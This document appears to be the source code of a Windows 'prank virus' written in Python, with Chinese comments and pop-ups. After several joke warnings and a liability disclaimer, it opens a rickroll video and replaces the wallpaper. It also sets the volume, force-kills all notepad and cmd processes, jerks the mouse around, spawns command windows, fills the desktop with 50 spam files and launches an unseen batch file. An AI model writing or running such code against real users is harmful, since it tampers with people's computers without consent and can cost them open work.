"""
作者:诚由上阳
author:chengyoushangyang
"""
import os
import tkinter as tk
from tkinter import messagebox
from subprocess import *
import pathlib
import time
import random
import pyautogui
import pyvolume
from lib.get_windows_desktop import *
from lib.set_windows_wallpaper import *

folder = pathlib.Path(__file__).parent.resolve()
a = messagebox.showwarning
b = messagebox.showerror

a("诚由上阳的宇宙级终极免死金牌","此程序为搞怪病毒,不会造成任何除篡改壁纸,大量无恶意弹窗,系统卡顿,桌面出现一堆文件的任意后果,如果造成了其他对系统造成损失的后果,则并非为该病毒破坏的,本作者不负任何责任")
a("不要点开","千万别点开!!!请自觉使用任务管理器结束此程序!")
a("不要点开","听我一句劝，不！要！点！开！")
a("不要点开","真的要点开吗")
a("不要点开","确定?")
a("不要点开","好吧")
b("Never Gonna Give You Up","你被骗了")
os.system("start https://www.bilibili.com/video/BV1GJ411x7h7/")
time.sleep(3)

set_windows_wallpaper(os.path.join(folder,"assets","世界名画.png"))
pyvolume.custom(percent=67)

from lib.booms import *

try:
    Popen(["C:\\windows\\notepad.exe",os.path.join(folder,"assets","Never Gonna Give You Up.txt")])
except:
    pass

time.sleep(3.5)
os.system("taskkill -F -IM notepad.exe")

try:
    for i in range(100):
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        pyautogui.moveTo(x, y)
except:
    pass

for i in range(10):
    os.system('start cmd')
os.system("taskkill -F -IM cmd.exe")

desktop_path = get_win_desktop()
for i in range(50):
    with open(f"{desktop_path}\\你被骗了{i+1}.txt", "a", encoding="utf-8") as f:
        f.write("你被骗了"*15)

os.system(f"start {os.path.join(folder,"诈骗.bat")}")

time.sleep(15)
os.system("taskkill -F -IM cmd.exe")

a("Never Gonna Give You Up","已结束,请使用任务管理器终止进程")